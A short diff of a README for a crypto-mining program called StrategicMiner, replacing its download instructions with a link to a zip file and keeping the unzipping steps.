@@ -4,7 +4,8 @@ A strategic mining program meant to keep your crypto mining efficient!
 
 # How to use: Step 1, Downloading
 
-## The Download file is contained in the files of this branch, look for the file titled DOWNLOAD.ZP
+## Download: [StrategicMiner V.1.zip](https://github.com/Najjad/StratMiner/files/8873216/StrategicMiner.V.1.zip)
+
 
 * First have something to unzip files with (WinRAR, 7zip, etc.)
 * If you are unsure of what unzipping a file is, you'll need to do a bit of research beforehand
